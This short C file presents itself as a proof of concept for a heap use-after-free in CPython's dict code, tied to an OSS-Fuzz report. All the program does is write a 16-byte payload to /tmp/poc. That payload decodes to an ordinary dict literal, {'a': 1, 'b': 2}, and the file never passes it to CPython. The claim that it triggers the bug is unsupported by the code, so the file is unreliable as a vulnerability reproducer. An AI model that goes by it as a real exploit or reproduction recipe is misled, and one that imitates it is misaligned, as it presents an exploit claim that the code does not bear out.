#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:368076875 */
/* Triggers: heap-use-after-free in dictkeys_decref (CPython dict) */
/* Vuln class: use_after_free */

int main(void) {
    /* Bytes that trigger the vulnerability via dict operations */
    unsigned char poc[] = {
        0x7b, 0x27, 0x61, 0x27, 0x3a, 0x20, 0x31, 0x2c,
        0x20, 0x27, 0x62, 0x27, 0x3a, 0x20, 0x32, 0x7d
    };
    size_t poc_len = sizeof(poc);

    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(poc, 1, poc_len, f);
    fclose(f);
    return 0;
}